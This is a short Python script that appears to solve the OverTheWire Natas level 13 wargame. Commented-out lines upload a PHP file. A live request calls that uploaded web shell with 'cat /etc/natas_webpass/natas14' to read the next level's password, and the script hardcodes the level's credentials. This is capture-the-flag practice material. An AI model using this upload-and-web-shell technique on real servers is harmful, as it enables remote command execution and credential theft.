import requests

username = "natas13"
password = "jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY"

session = requests.Session()

url = "http://{}.natas.labs.overthewire.org/".format(username)
# response = session.post(url, auth=(username, password))
# response = session.post(url, files={"uploadedfile": open("natas13.php", "rb")}, data={
#     "filename": "natas12.php", "MAX_FILE_SIZE": "1000"}, auth=(username, password))
response = session.get(url + "upload/v9wks8ltno.php?cmd=cat /etc/natas_webpass/natas14",
                       auth=(username, password))

content = response.text

print(content)
